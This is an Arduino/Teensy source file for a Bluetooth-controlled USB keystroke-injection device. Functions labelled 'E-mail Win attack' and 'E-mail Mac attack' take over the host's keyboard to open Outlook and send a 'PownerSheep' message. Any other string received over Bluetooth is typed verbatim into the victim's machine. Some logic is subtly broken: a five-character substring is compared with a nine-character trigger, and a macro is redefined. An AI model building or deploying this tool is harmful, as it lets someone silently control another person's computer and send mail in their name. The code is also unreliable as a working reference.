// Copyright 2014 Glenn ten Cate
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
// ------------------------------------------------------------------------------

#include <SoftwareSerial.h>

// RX, TX
SoftwareSerial mySerial(2, 0);
// Stores response of bluetooth device
String command = "";

void setup() 
{ 
   // Open serial communications and wait for port to open:
   Serial.begin(9600);
   //Possible to configure your JY-MCU
   Serial.println("Type AT commands!");
   // SoftwareSerial "com port" data rate. JY-MCU v1.03 defaults to 9600.
   mySerial.begin(9600);
}

void loop()
{ 
   // Read device output if available.
   if (mySerial.available()) {
     while(mySerial.available()) { // While there is more to be read, keep reading.
       command += (char)mySerial.read();
     }
       //Print command also to serial easy for debugging
       Serial.println(command);
     
       //check for fixed string to trigger function
       if (command.substring(0,5) == "sheep win") {
                  #define MSG "Beeeeh, PownerSheep"
                  delay(2500);
                  sheepMailWin(MSG);
        }else if(command.substring(0,9) == "sheep mac"){
                  #define MSG "Beeeeh, PownerSheep"
                  delay(2500);
                  sheepMailMac(MSG); 
        }else{
                  //Not using function, then print the string only
                  Keyboard.println(command);
        }
        command = ""; // No repeats
   }
  
   // Read user input if available.
   if (Serial.available()){
       delay(10); // The DELAY!
       mySerial.print(Serial.read());
   }
}// END loop()

//E-mail Win attack
void sheepMailWin(char *SomeCommand){
  Keyboard.print(SomeCommand);
  delay(1500);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_S);
  Keyboard.send_now();

  // Reset key
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

//E-mail Mac attack
void sheepMailMac(char *SomeCommand){
  delay(1500);
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_SPACE);
  Keyboard.send_now();
  delay(1500);

  // Reset key
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print("outlook");
  delay(1500);
  
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_N);
  Keyboard.send_now();
  // Reset key
  Keyboard.set_key1(0);
  Keyboard.send_now();
  Keyboard.print(SomeCommand);
  delay(1500);
  
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_S);
  Keyboard.send_now();
  // Reset key
  Keyboard.set_key1(0);
  Keyboard.send_now();

}
